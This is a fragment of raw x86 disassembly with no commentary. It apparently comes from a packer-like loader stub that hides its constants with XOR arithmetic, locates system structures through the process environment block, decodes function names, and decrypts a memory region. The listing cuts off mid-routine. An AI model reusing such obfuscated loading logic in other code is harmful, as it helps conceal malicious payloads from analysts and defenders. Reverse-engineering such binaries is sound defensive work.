  416dba:	sub    esi,DWORD PTR [ebp+0x18]
  416dbd:	mov    DWORD PTR [edx],esi
  416dbf:	mov    edx,DWORD PTR [ebp+0x2c]
  416dc2:	mov    edi,DWORD PTR [ebp-0x4]
  416dc5:	sub    edi,DWORD PTR [ebp+0x24]
  416dc8:	mov    DWORD PTR [edx],edi
  416dca:	leave  
  416dcb:	pop    ebx
  416dcc:	pop    esi
  416dcd:	pop    edi
  416dce:	ret    0x1c
  416dd1:	pop    esi
  416dd2:	pop    eax
  416dd3:	sub    eax,eax
  416dd5:	inc    eax
  416dd6:	jmp    0x416db0
  416dd8:	cmp    ebx,0x1000000
  416dde:	jb     0x416de1
  416de0:	ret    
  416de1:	shl    ebx,0x8
  416de4:	push   esi
  416de5:	mov    esi,DWORD PTR [ebp-0x8]
  416de8:	cmp    esi,DWORD PTR [ebp+0x1c]
  416deb:	jae    0x416dd1
  416ded:	mov    eax,DWORD PTR [ebp-0x20]
  416df0:	shl    eax,0x8
  416df3:	lods   al,BYTE PTR ds:[esi]
  416df4:	mov    DWORD PTR [ebp-0x20],eax
  416df7:	mov    DWORD PTR [ebp-0x8],esi
  416dfa:	pop    esi
  416dfb:	ret    
  416dfc:	mov    ecx,DWORD PTR [ebp-0x3c]
  416dff:	movzx  eax,al
  416e02:	shl    ecx,0x4
  416e05:	add    eax,DWORD PTR [ebp-0x18]
  416e08:	add    eax,ecx
  416e0a:	jmp    0x416e12
  416e0c:	movzx  eax,al
  416e0f:	add    eax,DWORD PTR [ebp-0x3c]
  416e12:	mov    ebp,DWORD PTR [ebp-0x38]
  416e15:	lea    ebp,[ebp+eax*2+0x0]
  416e19:	sub    eax,eax
  416e1b:	lea    ebp,[ebp+eax*2+0x0]
  416e1f:	cmp    ebx,0x1000000
  416e25:	jae    0x416e43
  416e27:	mov    ecx,DWORD PTR [esp+0x38]
  416e2b:	shl    DWORD PTR [esp+0x20],0x8
  416e30:	cmp    ecx,DWORD PTR [esp+0x5c]
  416e34:	jae    0x416dd2
  416e36:	mov    dl,BYTE PTR [ecx]
  416e38:	inc    DWORD PTR [esp+0x38]
  416e3c:	shl    ebx,0x8
  416e3f:	mov    BYTE PTR [esp+0x20],dl
  416e43:	mov    ecx,ebx
  416e45:	movzx  edx,WORD PTR [ebp+0x0]
  416e49:	shr    ecx,0xb
  416e4c:	imul   ecx,edx
  416e4f:	cmp    DWORD PTR [esp+0x20],ecx
  416e53:	jae    0x416e6c
  416e55:	mov    ebx,ecx
  416e57:	mov    ecx,0x800
  416e5c:	sub    ecx,edx
  416e5e:	shr    ecx,0x5
  416e61:	add    WORD PTR [ebp+0x0],cx
  416e65:	add    eax,eax
  416e67:	lea    ebp,[esp+0x40]
  416e6b:	ret    
  416e6c:	shr    edx,0x5
  416e6f:	sub    DWORD PTR [esp+0x20],ecx
  416e73:	sub    ebx,ecx
  416e75:	sub    WORD PTR [ebp+0x0],dx
  416e79:	add    eax,eax
  416e7b:	add    eax,0x1
  416e7e:	lea    ebp,[esp+0x40]
  416e82:	ret    
  416e83:	push   ebp
  416e84:	mov    ebp,esp
  416e86:	sub    esp,0x104
  416e8c:	push   ebx
  416e8d:	push   esi
  416e8e:	push   edi
  416e8f:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  416e96:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  416e9d:	mov    eax,DWORD PTR [ebp+0x8]
  416ea0:	mov    DWORD PTR [ebp+0x8],eax
  416ea3:	mov    ecx,DWORD PTR [ebp-0x14]
  416ea6:	mov    ebx,0x751089b
  416eab:	xor    ecx,ebx
  416ead:	mov    eax,0x3272e2
  416eb2:	add    ecx,eax
  416eb4:	mov    DWORD PTR [ebp-0x2c],ecx
  416eb7:	mov    ecx,DWORD PTR [ebp-0x14]
  416eba:	xor    ecx,ebx
  416ebc:	add    ecx,eax
  416ebe:	mov    DWORD PTR [ebp-0x3c],ecx
  416ec1:	mov    ecx,DWORD PTR [ebp-0x14]
  416ec4:	xor    ecx,ebx
  416ec6:	add    ecx,eax
  416ec8:	mov    DWORD PTR [ebp-0x40],ecx
  416ecb:	mov    ecx,DWORD PTR [ebp-0x14]
  416ece:	xor    ecx,ebx
  416ed0:	add    ecx,eax
  416ed2:	mov    DWORD PTR [ebp-0xa0],ecx
  416ed8:	mov    DWORD PTR [ebp-0x50],0xf89f0585
  416edf:	mov    DWORD PTR [ebp-0x40],0xf89cb585
  416ee6:	mov    DWORD PTR [ebp-0x4c],0xf89c85b9
  416eed:	push   0x25
  416eef:	pop    ecx
  416ef0:	mov    DWORD PTR [ebp-0x34],ecx
  416ef3:	mov    DWORD PTR [ebp-0x34],ecx
  416ef6:	push   0x65
  416ef8:	pop    ecx
  416ef9:	mov    DWORD PTR [ebp-0x34],ecx
  416efc:	mov    DWORD PTR [ebp-0x34],ecx
  416eff:	mov    DWORD PTR [ebp-0x34],0x4d
  416f06:	mov    DWORD PTR [ebp-0x34],0x43
  416f0d:	mov    ecx,DWORD PTR [ebp-0x14]
  416f10:	xor    ecx,ebx
  416f12:	add    ecx,eax
  416f14:	mov    DWORD PTR [ebp-0x34],ecx
  416f17:	mov    ecx,DWORD PTR [ebp-0x14]
  416f1a:	xor    ecx,ebx
  416f1c:	add    ecx,eax
  416f1e:	mov    DWORD PTR [ebp-0x34],ecx
  416f21:	mov    DWORD PTR [ebp-0x28],0x257
  416f28:	mov    DWORD PTR [ebp-0x20],0x35
  416f2f:	mov    DWORD PTR [ebp-0x10],0x79
  416f36:	lea    edi,[ebp-0xe4]
  416f3c:	lea    esi,[ebp-0x104]
  416f42:	call   0x417b5e
  416f47:	dec    DWORD PTR [ebp-0x10]
  416f4a:	jne    0x416f36
  416f4c:	dec    DWORD PTR [ebp-0x20]
  416f4f:	jne    0x416f2f
  416f51:	dec    DWORD PTR [ebp-0x28]
  416f54:	jne    0x416f28
  416f56:	mov    DWORD PTR [ebp-0x28],0x400d
  416f5d:	mov    eax,DWORD PTR [ebp-0x14]
  416f60:	xor    eax,ebx
  416f62:	mov    esi,0x3272e2
  416f67:	add    eax,esi
  416f69:	mov    DWORD PTR [ebp-0x8],eax
  416f6c:	mov    eax,DWORD PTR [ebp-0x14]
  416f6f:	and    DWORD PTR [ebp-0x94],0x0
  416f76:	xor    eax,ebx
  416f78:	add    eax,esi
  416f7a:	mov    DWORD PTR [ebp-0x38],eax
  416f7d:	mov    eax,fs:0x18
  416f83:	mov    DWORD PTR [ebp-0x94],eax
  416f89:	mov    eax,DWORD PTR [eax+0x30]
  416f8c:	mov    DWORD PTR [ebp-0x98],eax
  416f92:	mov    eax,DWORD PTR [eax+0xc]
  416f95:	mov    DWORD PTR [ebp-0xc0],eax
  416f9b:	mov    eax,DWORD PTR [ebp+0x8]
  416f9e:	lea    ecx,[ebp-0x94]
  416fa4:	mov    DWORD PTR [eax+0x1a0],ecx
  416faa:	mov    eax,DWORD PTR [ebp+0x8]
  416fad:	lea    ecx,[ebp-0x98]
  416fb3:	mov    DWORD PTR [eax+0x1a4],ecx
  416fb9:	mov    eax,DWORD PTR [ebp+0x8]
  416fbc:	push   DWORD PTR [ebp+0x8]
  416fbf:	lea    ecx,[ebp-0xc0]
  416fc5:	mov    DWORD PTR [eax+0x1a8],ecx
  416fcb:	call   0x419344
  416fd0:	mov    ecx,DWORD PTR [ebp-0x14]
  416fd3:	xor    ecx,ebx
  416fd5:	add    ecx,esi
  416fd7:	cmp    ecx,eax
  416fd9:	je     0x4172b6
  416fdf:	mov    eax,DWORD PTR [ebp+0x8]
  416fe2:	mov    eax,DWORD PTR [eax+0x194]
  416fe8:	mov    ecx,DWORD PTR [eax]
  416fea:	mov    eax,DWORD PTR [ebp+0x8]
  416fed:	mov    eax,DWORD PTR [eax+0x194]
  416ff3:	mov    eax,DWORD PTR [eax]
  416ff5:	add    eax,DWORD PTR [ecx+0x3c]
  416ff8:	mov    ecx,DWORD PTR [ebp+0x8]
  416ffb:	mov    ecx,DWORD PTR [ecx+0x1d8]
  417001:	lea    edx,[ebp-0xc4]
  417007:	push   edx
  417008:	mov    edx,DWORD PTR [ebp+0x8]
  41700b:	mov    edx,DWORD PTR [edx+0x18c]
  417011:	mov    edx,DWORD PTR [edx]
  417013:	add    edx,DWORD PTR [eax+0x88]
  417019:	push   0x4
  41701b:	push   DWORD PTR [eax+0x8c]
  417021:	push   edx
  417022:	call   DWORD PTR [ecx+0x1c]
  417025:	push   DWORD PTR [ebp+0x8]
  417028:	mov    edi,DWORD PTR [ebp+0x8]
  41702b:	mov    eax,DWORD PTR [ebp+0x8]
  41702e:	mov    edx,DWORD PTR [eax+0x1b8]
  417034:	mov    DWORD PTR [ebp-0x68],0xe080f00
  41703b:	mov    DWORD PTR [ebp-0x64],0x50c011f
  417042:	mov    WORD PTR [ebp-0x60],0x7c3d
  417048:	mov    DWORD PTR [ebp-0x90],0x43f0f25
  417052:	mov    DWORD PTR [ebp-0x8c],0x3d0e1d
  41705c:	mov    DWORD PTR [ebp-0x88],0x221d040c
  417066:	mov    DWORD PTR [ebp-0x84],0xe190109
  417070:	mov    DWORD PTR [ebp-0x80],0x7c3d1f05
  417077:	mov    DWORD PTR [ebp-0x7c],0x43f0f25
  41707e:	mov    DWORD PTR [ebp-0x78],0x3d0e1d
  417085:	mov    DWORD PTR [ebp-0x74],0x221d040c
  41708c:	mov    DWORD PTR [ebp-0x70],0xe190109
  417093:	mov    DWORD PTR [ebp-0x6c],0x7c2b1f05
  41709a:	call   0x419373
  41709f:	push   eax
  4170a0:	mov    eax,DWORD PTR [ebp+0x8]
  4170a3:	mov    eax,DWORD PTR [eax+0x1a8]
  4170a9:	push   DWORD PTR [eax]
  4170ab:	call   0x419014
  4170b0:	test   eax,eax
  4170b2:	jne    0x417104
  4170b4:	mov    eax,DWORD PTR [ebp+0x8]
  4170b7:	mov    eax,DWORD PTR [eax+0x1d8]
  4170bd:	mov    edi,DWORD PTR [ebp+0x8]
  4170c0:	add    eax,0x4
  4170c3:	mov    DWORD PTR [ebp-0x24],eax
  4170c6:	mov    eax,DWORD PTR [ebp+0x8]
  4170c9:	mov    edx,DWORD PTR [eax+0x1b8]
  4170cf:	call   0x419373
  4170d4:	push   eax
  4170d5:	mov    eax,DWORD PTR [ebp-0x24]
  4170d8:	call   DWORD PTR [eax]
  4170da:	test   eax,eax
  4170dc:	jne    0x417104
  4170de:	mov    eax,DWORD PTR [ebp+0x8]
  4170e1:	mov    eax,DWORD PTR [eax+0x1d8]
  4170e7:	mov    edi,DWORD PTR [ebp+0x8]
  4170ea:	add    eax,0x10
  4170ed:	mov    DWORD PTR [ebp-0x24],eax
  4170f0:	mov    eax,DWORD PTR [ebp+0x8]
  4170f3:	mov    edx,DWORD PTR [eax+0x1b8]
  4170f9:	call   0x419373
  4170fe:	push   eax
  4170ff:	mov    eax,DWORD PTR [ebp-0x24]
  417102:	call   DWORD PTR [eax]
  417104:	mov    eax,DWORD PTR [ebp-0x14]
  417107:	mov    ecx,DWORD PTR [ebp-0x28]
  41710a:	xor    eax,ebx
  41710c:	add    eax,esi
  41710e:	cmp    eax,ecx
  417110:	je     0x41728f
  417116:	mov    eax,DWORD PTR [ebp-0x18]
  417119:	xor    eax,ebx
  41711b:	mov    ecx,0xffcd8d1e
  417120:	sub    ecx,eax
  417122:	add    ecx,DWORD PTR [ebp-0x28]
  417125:	mov    eax,DWORD PTR [ebp-0x8]
  417128:	cmp    eax,ecx
  41712a:	ja     0x41728f
  417130:	mov    DWORD PTR [ebp-0x20],0x0
  417137:	push   DWORD PTR [ebp+0x8]
  41713a:	mov    edi,DWORD PTR [ebp+0x8]
  41713d:	mov    eax,DWORD PTR [ebp+0x8]
  417140:	mov    edx,DWORD PTR [eax+0x1b4]
  417146:	call   0x419373
  41714b:	push   eax
  41714c:	mov    eax,DWORD PTR [ebp+0x8]
  41714f:	mov    eax,DWORD PTR [eax+0x1a8]
  417155:	push   DWORD PTR [eax]
  417157:	call   0x419014
  41715c:	mov    ecx,DWORD PTR [ebp+0x8]
  41715f:	mov    ecx,DWORD PTR [ecx+0x19c]
  417165:	mov    DWORD PTR [ecx],eax
  417167:	mov    eax,DWORD PTR [ebp+0x8]
  41716a:	mov    edi,DWORD PTR [eax+0x1d8]
  417170:	mov    esi,DWORD PTR [ebp+0x8]
  417173:	xor    eax,eax
  417175:	lea    edx,[ebp-0x7c]
  417178:	call   0x4193a9
  41717d:	push   eax
  41717e:	mov    eax,DWORD PTR [ebp+0x8]
  417181:	mov    eax,DWORD PTR [eax+0x19c]
  417187:	push   DWORD PTR [eax]
  417189:	call   DWORD PTR [edi+0x8]
  41718c:	mov    DWORD PTR [ebp-0x24],eax
  41718f:	mov    eax,DWORD PTR [ebp+0x8]
  417192:	mov    edi,DWORD PTR [eax+0x1d8]
  417198:	mov    esi,DWORD PTR [ebp+0x8]
  41719b:	xor    eax,eax
  41719d:	lea    edx,[ebp-0x90]
  4171a3:	call   0x4193a9
  4171a8:	push   eax
  4171a9:	mov    eax,DWORD PTR [ebp+0x8]
  4171ac:	mov    eax,DWORD PTR [eax+0x19c]
  4171b2:	push   DWORD PTR [eax]
  4171b4:	call   DWORD PTR [edi+0x8]
  4171b7:	and    DWORD PTR [ebp-0x1c],0x0
  4171bb:	mov    eax,DWORD PTR [ebp-0x1c]
  4171be:	and    eax,0x7
  4171c1:	add    eax,0x31
  4171c4:	push   eax
  4171c5:	call   DWORD PTR [ebp-0x24]
  4171c8:	test   eax,eax
  4171ca:	jne    0x4171d1
  4171cc:	and    DWORD PTR [ebp-0x10],eax
  4171cf:	jmp    0x4171f9
  4171d1:	mov    eax,DWORD PTR [ebp+0x8]
  4171d4:	mov    edi,DWORD PTR [eax+0x1d8]
  4171da:	mov    esi,DWORD PTR [ebp+0x8]
  4171dd:	xor    eax,eax
  4171df:	lea    edx,[ebp-0x68]
  4171e2:	call   0x4193a9
  4171e7:	push   eax
  4171e8:	mov    eax,DWORD PTR [ebp+0x8]
  4171eb:	mov    eax,DWORD PTR [eax+0x198]
  4171f1:	push   DWORD PTR [eax]
  4171f3:	call   DWORD PTR [edi+0x8]
  4171f6:	mov    DWORD PTR [ebp-0x10],eax
  4171f9:	inc    DWORD PTR [ebp-0x1c]
  4171fc:	cmp    DWORD PTR [ebp-0x1c],0x10
  417200:	jb     0x4171bb
  417202:	mov    eax,DWORD PTR [ebp-0x18]
  417205:	mov    esi,DWORD PTR [ebp+0x8]
  417208:	xor    eax,ebx
  41720a:	mov    edi,0x3272e2
  41720f:	add    eax,edi
  417211:	lea    edx,[ebp-0xe4]
  417217:	call   0x4193a9
  41721c:	push   eax
  41721d:	mov    eax,DWORD PTR [ebp-0x14]
  417220:	mov    esi,DWORD PTR [ebp+0x8]
  417223:	xor    eax,ebx
  417225:	add    eax,edi
  417227:	lea    edx,[ebp-0x104]
  41722d:	call   0x4193a9
  417232:	push   eax
  417233:	call   DWORD PTR [ebp-0x10]
  417236:	mov    ecx,DWORD PTR [ebp-0x14]
  417239:	xor    ecx,ebx
  41723b:	add    ecx,edi
  41723d:	cmp    ecx,eax
  41723f:	jne    0x417248
  417241:	mov    DWORD PTR [ebp-0x20],0x1
  417248:	mov    eax,DWORD PTR [ebp-0x18]
  41724b:	mov    ecx,DWORD PTR [ebp-0x8]
  41724e:	xor    eax,ebx
  417250:	lea    eax,[eax+ecx*1+0x3272e2]
  417257:	mov    DWORD PTR [ebp-0x8],eax
  41725a:	mov    eax,DWORD PTR [ebp-0x20]
  41725d:	test   eax,eax
  41725f:	je     0x417273
  417261:	mov    eax,DWORD PTR [ebp-0x18]
  417264:	mov    ecx,DWORD PTR [ebp-0x38]
  417267:	xor    eax,ebx
  417269:	lea    eax,[eax+ecx*1+0x3272e2]
  417270:	mov    DWORD PTR [ebp-0x38],eax
  417273:	mov    eax,DWORD PTR [ebp-0x18]
  417276:	xor    eax,ebx
  417278:	mov    ecx,0xffcd8d1e
  41727d:	sub    ecx,eax
  41727f:	add    ecx,DWORD PTR [ebp-0x28]
  417282:	mov    eax,DWORD PTR [ebp-0x8]
  417285:	cmp    eax,ecx
  417287:	jbe    0x417130
  41728d:	mov    esi,edi
  41728f:	mov    eax,DWORD PTR [ebp-0x38]
  417292:	mov    ecx,DWORD PTR [ebp-0x8]
  417295:	cmp    ecx,eax
  417297:	jne    0x4172aa
  417299:	push   DWORD PTR [ebp+0x8]
  41729c:	lea    eax,[ebp-0x3c]
  41729f:	push   eax
  4172a0:	call   0x419e21
  4172a5:	mov    DWORD PTR [ebp-0x2c],eax
  4172a8:	jmp    0x4172b6
  4172aa:	mov    eax,DWORD PTR [ebp-0x2c]
  4172ad:	mov    ecx,DWORD PTR [ebp-0x18]
  4172b0:	xor    ecx,ebx
  4172b2:	add    ecx,esi
  4172b4:	xor    DWORD PTR [eax],ecx
  4172b6:	mov    eax,DWORD PTR [ebp-0x14]
  4172b9:	mov    ecx,DWORD PTR [ebp-0x2c]
  4172bc:	xor    eax,ebx
  4172be:	add    eax,esi
  4172c0:	cmp    eax,ecx
  4172c2:	je     0x417a3c
  4172c8:	mov    eax,DWORD PTR [ebp-0x14]
  4172cb:	mov    ecx,DWORD PTR [ebp-0x3c]
  4172ce:	xor    eax,ebx
  4172d0:	add    eax,esi
  4172d2:	cmp    eax,ecx
  4172d4:	je     0x417a3c
  4172da:	mov    eax,DWORD PTR [ebp-0x14]
  4172dd:	xor    eax,ebx
  4172df:	add    eax,esi
  4172e1:	jmp    0x4172ff
  4172e3:	mov    edi,DWORD PTR [ebp-0x2c]
  4172e6:	mov    cl,al
  4172e8:	and    cl,0x1f
  4172eb:	or     dl,0xff
  4172ee:	sub    dl,cl
  4172f0:	add    BYTE PTR [edi+eax*1],dl
  4172f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4172f6:	xor    ecx,ebx
  4172f8:	lea    eax,[eax+ecx*1+0x3272e2]
  4172ff:	mov    ecx,DWORD PTR [ebp-0x3c]
  417302:	cmp    eax,ecx
  417304:	jb     0x4172e3
  417306:	mov    eax,DWORD PTR [ebp-0x3c]
  417309:	mov    DWORD PTR [ebp-0x28],eax
  41730c:	mov    eax,DWORD PTR [ebp-0x2c]
  41730f:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  417316:	mov    DWORD PTR [ebp-0xbc],eax
  41731c:	mov    edi,0xf89c8584
  417321:	mov    DWORD PTR [ebp-0x30],edi
  417324:	mov    eax,DWORD PTR [ebp-0x38]
  417327:	xor    eax,ebx
  417329:	add    eax,esi
  41732b:	mov    DWORD PTR [ebp-0xc],eax
  41732e:	mov    eax,DWORD PTR [ebp-0x38]
  417331:	xor    eax,ebx
  417333:	add    eax,esi
  417335:	mov    DWORD PTR [ebp-0x8],eax
  417338:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  41733f:	mov    DWORD PTR [ebp-0x54],0xf89c85be
  417346:	mov    eax,DWORD PTR [ebp-0x38]
  417349:	mov    ecx,DWORD PTR [ebp-0x28]
  41734c:	xor    eax,ebx
  41734e:	add    eax,esi
  417350:	cmp    ecx,eax
  417352:	je     0x417551
  417358:	jmp    0x41752d
  41735d:	mov    ecx,DWORD PTR [ebp-0xc]
  417360:	mov    eax,DWORD PTR [ebp-0x28]
  417363:	sub    eax,ecx
  417365:	mov    ecx,DWORD PTR [ebp-0x48]
  417368:	xor    ecx,ebx
  41736a:	add    ecx,esi
  41736c:	xor    edx,edx
  41736e:	div    ecx
  417370:	mov    DWORD PTR [ebp-0x8],eax
  417373:	mov    eax,DWORD PTR [ebp-0x54]
  417376:	mov    ecx,DWORD PTR [ebp-0x8]
  417379:	xor    eax,ebx
  41737b:	add    eax,esi
  41737d:	cmp    ecx,eax
  41737f:	jbe    0x41738b
  417381:	mov    eax,DWORD PTR [ebp-0x54]
  417384:	xor    eax,ebx
  417386:	add    eax,esi
  417388:	mov    DWORD PTR [ebp-0x8],eax
  41738b:	mov    eax,DWORD PTR [ebp-0x48]
  41738e:	mov    ecx,DWORD PTR [ebp-0x8]
  417391:	xor    eax,ebx
  417393:	add    eax,esi
  417395:	imul   eax,ecx
  417398:	mov    DWORD PTR [ebp-0x8],eax
  41739b:	mov    eax,DWORD PTR [ebp-0x38]
  41739e:	mov    ecx,DWORD PTR [ebp-0x8]
  4173a1:	xor    eax,ebx
  4173a3:	add    eax,esi
  4173a5:	cmp    ecx,eax
  4173a7:	je     0x41751b
  4173ad:	mov    eax,DWORD PTR [ebp-0x8]
  4173b0:	mov    DWORD PTR [ebp-0x10],eax
  4173b3:	mov    eax,DWORD PTR [ebp-0xc]
  4173b6:	add    eax,DWORD PTR [ebp-0xbc]
  4173bc:	mov    DWORD PTR [ebp-0x24],0xf89c8585
  4173c3:	mov    DWORD PTR [ebp-0x20],edi
  4173c6:	mov    DWORD PTR [ebp-0xa8],0xf89c85bb
  4173d0:	mov    DWORD PTR [ebp-0x8],eax
  4173d3:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  4173da:	mov    DWORD PTR [ebp-0x1c],edi
  4173dd:	mov    eax,DWORD PTR [ebp-0x24]
  4173e0:	xor    eax,ebx
  4173e2:	add    eax,esi
  4173e4:	jmp    0x4174da
  4173e9:	mov    DWORD PTR [ebp-0xb0],0xf89c85b3
  4173f3:	mov    DWORD PTR [ebp-0xb8],0xf89c85a9
  4173fd:	mov    eax,DWORD PTR [ebp-0x1c]
  417400:	mov    ecx,DWORD PTR [ebp-0x44]
  417403:	xor    eax,ebx
  417405:	add    eax,esi
  417407:	imul   eax,ecx
  41740a:	mov    ecx,DWORD PTR [ebp-0x8]
  41740d:	mov    al,BYTE PTR [eax+ecx*1]
  417410:	mov    BYTE PTR [ebp-0x2],al
  417413:	mov    eax,DWORD PTR [ebp-0x1c]
  417416:	mov    ecx,DWORD PTR [ebp-0x44]
  417419:	xor    eax,ebx
  41741b:	add    eax,esi
  41741d:	imul   eax,ecx
  417420:	mov    ecx,DWORD PTR [ebp-0xa8]
  417426:	xor    ecx,ebx
  417428:	add    eax,ecx
  41742a:	mov    ecx,DWORD PTR [ebp-0x8]
  41742d:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  417435:	mov    ecx,DWORD PTR [ebp-0xb0]
  41743b:	xor    ecx,ebx
  41743d:	lea    eax,[ecx+eax*1+0x3272e2]
  417444:	movzx  ecx,BYTE PTR [ebp-0x2]
  417448:	xor    ecx,eax
  41744a:	mov    BYTE PTR [ebp-0x2],cl
  41744d:	mov    al,BYTE PTR [ebp-0x2]
  417450:	mov    ecx,DWORD PTR [ebp-0x1c]
  417453:	mov    edx,DWORD PTR [ebp-0x44]
  417456:	xor    ecx,ebx
  417458:	add    ecx,esi
  41745a:	imul   ecx,edx
  41745d:	mov    edx,DWORD PTR [ebp-0x8]
  417460:	mov    BYTE PTR [ecx+edx*1],al
  417463:	mov    eax,DWORD PTR [ebp-0x1c]
  417466:	mov    ecx,DWORD PTR [ebp-0x44]
  417469:	xor    eax,ebx
  41746b:	add    eax,esi
  41746d:	imul   eax,ecx
  417470:	mov    ecx,DWORD PTR [ebp-0x8]
  417473:	mov    al,BYTE PTR [eax+ecx*1]
  417476:	mov    BYTE PTR [ebp-0x2],al
  417479:	mov    eax,DWORD PTR [ebp-0x1c]
  41747c:	mov    ecx,DWORD PTR [ebp-0x44]
  41747f:	xor    eax,ebx
  417481:	add    eax,esi
  417483:	imul   eax,ecx
  417486:	mov    ecx,DWORD PTR [ebp-0x20]
  417489:	xor    ecx,ebx
  41748b:	add    eax,ecx
  41748d:	mov    ecx,DWORD PTR [ebp-0x8]
  417490:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  417498:	mov    ecx,DWORD PTR [ebp-0xb8]
  41749e:	xor    ecx,ebx
  4174a0:	lea    eax,[ecx+eax*1+0x3272e2]
  4174a7:	movzx  ecx,BYTE PTR [ebp-0x2]
  4174ab:	xor    ecx,eax
  4174ad:	mov    BYTE PTR [ebp-0x2],cl
  4174b0:	mov    al,BYTE PTR [ebp-0x2]
  4174b3:	mov    ecx,DWORD PTR [ebp-0x1c]
  4174b6:	mov    edx,DWORD PTR [ebp-0x44]
  4174b9:	xor    ecx,ebx
  4174bb:	add    ecx,esi
  4174bd:	imul   ecx,edx
  4174c0:	mov    edx,DWORD PTR [ebp-0x8]
  4174c3:	mov    BYTE PTR [ecx+edx*1],al
  4174c6:	mov    eax,DWORD PTR [ebp-0x34]
  4174c9:	mov    ecx,DWORD PTR [ebp-0x20]
  4174cc:	xor    eax,ebx
  4174ce:	xor    ecx,ebx
  4174d0:	add    eax,esi
  4174d2:	add    ecx,esi
  4174d4:	imul   eax,ecx
  4174d7:	add    eax,DWORD PTR [ebp-0x44]
  4174da:	mov    DWORD PTR [ebp-0x44],eax
  4174dd:	mov    eax,DWORD PTR [ebp-0x44]
  4174e0:	mov    ecx,DWORD PTR [ebp-0x10]
  4174e3:	cmp    ecx,eax
  4174e5:	jb     0x4173e9
  4174eb:	mov    eax,DWORD PTR [ebp-0x20]
  4174ee:	mov    ecx,DWORD PTR [ebp-0x10]
  4174f1:	xor    eax,ebx
  4174f3:	add    eax,esi
  4174f5:	imul   eax,ecx
  4174f8:	mov    ecx,DWORD PTR [ebp-0x24]
  4174fb:	xor    ecx,ebx
  4174fd:	add    ecx,esi
  4174ff:	or     eax,ecx
  417501:	mov    ecx,DWORD PTR [ebp-0x30]
  417504:	xor    ecx,ebx
  417506:	add    eax,ecx
  417508:	mov    ecx,DWORD PTR [ebp-0x30]
  41750b:	xor    ecx,ebx
  41750d:	add    eax,ecx
  41750f:	mov    ecx,DWORD PTR [ebp-0xc]
  417512:	lea    eax,[eax+ecx*1+0x64e5c4]
  417519:	jmp    0x41752a
  41751b:	mov    eax,DWORD PTR [ebp-0x30]
  41751e:	mov    ecx,DWORD PTR [ebp-0xc]
  417521:	xor    eax,ebx
  417523:	lea    eax,[eax+ecx*1+0x3272e2]
  41752a:	mov    DWORD PTR [ebp-0xc],eax
  41752d:	mov    eax,DWORD PTR [ebp-0x30]
  417530:	xor    eax,ebx
  417532:	mov    ecx,0xffcd8d1e
  417537:	sub    ecx,eax
  417539:	add    ecx,DWORD PTR [ebp-0x28]
  41753c:	mov    eax,DWORD PTR [ebp-0x30]
  41753f:	mov    edx,DWORD PTR [ebp-0xc]
  417542:	xor    eax,ebx
  417544:	add    eax,esi
  417546:	imul   eax,edx
  417549:	cmp    eax,ecx
  41754b:	jbe    0x41735d
  417551:	mov    eax,DWORD PTR [ebp-0x14]
  417554:	mov    ecx,DWORD PTR [ebp-0x3c]
  417557:	mov    eax,DWORD PTR [ebp+0x8]
  41755a:	mov    edx,DWORD PTR [ebp-0x4c]
  41755d:	mov    eax,DWORD PTR [eax+0x1d8]
  417563:	xor    edx,ebx
  417565:	add    edx,esi
  417567:	push   edx
  417568:	mov    edx,DWORD PTR [ebp-0x40]
  41756b:	xor    edx,ebx
  41756d:	add    edx,esi
  41756f:	push   edx
  417570:	push   ecx
  417571:	mov    DWORD PTR [ebp-0x34],ecx
  417574:	mov    ecx,DWORD PTR [ebp-0x14]
  417577:	xor    ecx,ebx
  417579:	add    ecx,esi
  41757b:	push   ecx
  41757c:	call   DWORD PTR [eax+0x14]
  41757f:	mov    edi,eax
  417581:	mov    eax,DWORD PTR [ebp-0x14]
  417584:	xor    eax,ebx
  417586:	add    eax,esi
  417588:	cmp    eax,edi
  41758a:	je     0x4175e5
  41758c:	mov    eax,DWORD PTR [ebp-0x14]
  41758f:	jmp    0x4175b2
  417591:	mov    ecx,DWORD PTR [ebp-0x2c]
  417594:	xor    eax,ebx
  417596:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e2]
  41759d:	mov    BYTE PTR [eax+edi*1+0x3272e2],cl
  4175a4:	mov    ecx,DWORD PTR [ebp-0x18]
  4175a7:	xor    ecx,ebx
  4175a9:	lea    eax,[ecx+eax*1+0x3272e2]
  4175b0:	xor    eax,ebx
  4175b2:	mov    ecx,DWORD PTR [ebp-0x3c]
  4175b5:	sub    ecx,esi
  4175b7:	xor    ecx,ebx
  4175b9:	cmp    eax,ecx
  4175bb:	jne    0x417591
  4175bd:	mov    eax,DWORD PTR [ebp+0x8]
  4175c0:	mov    ecx,DWORD PTR [ebp-0x50]
  4175c3:	mov    eax,DWORD PTR [eax+0x1d8]
  4175c9:	xor    ecx,ebx
  4175cb:	add    ecx,esi
  4175cd:	push   ecx
  4175ce:	mov    ecx,DWORD PTR [ebp-0x14]
  4175d1:	xor    ecx,ebx
  4175d3:	add    ecx,esi
  4175d5:	push   ecx
  4175d6:	push   DWORD PTR [ebp-0x2c]
  4175d9:	call   DWORD PTR [eax+0x18]
  4175dc:	mov    eax,DWORD PTR [ebp-0x34]
  4175df:	mov    DWORD PTR [ebp-0x2c],edi
  4175e2:	mov    DWORD PTR [ebp-0x3c],eax
  4175e5:	mov    eax,DWORD PTR [ebp-0x2c]
  4175e8:	mov    DWORD PTR [ebp-0x10],eax
  4175eb:	mov    eax,DWORD PTR [ebp-0x18]
  4175ee:	mov    ecx,DWORD PTR [ebp-0x14]
  4175f1:	xor    eax,ebx
  4175f3:	add    eax,esi
  4175f5:	mov    DWORD PTR [ebp-0x5c],0x3d142c14
  4175fc:	mov    DWORD PTR [ebp-0x58],0x27143f14
  417603:	jmp    0x417636
  417605:	mov    edx,DWORD PTR [ebp-0x10]
  417608:	mov    edi,ecx
  41760a:	xor    edi,ebx
  41760c:	mov    cl,BYTE PTR [ebp+edi*1+0x327286]
  417613:	movsx  edx,BYTE PTR [edi+edx*1+0x3272e2]
  41761b:	xor    cl,0x74
  41761e:	sub    cl,0x8
  417621:	movzx  ecx,cl
  417624:	cmp    edx,ecx
  417626:	jne    0x417640
  417628:	mov    ecx,DWORD PTR [ebp-0x18]
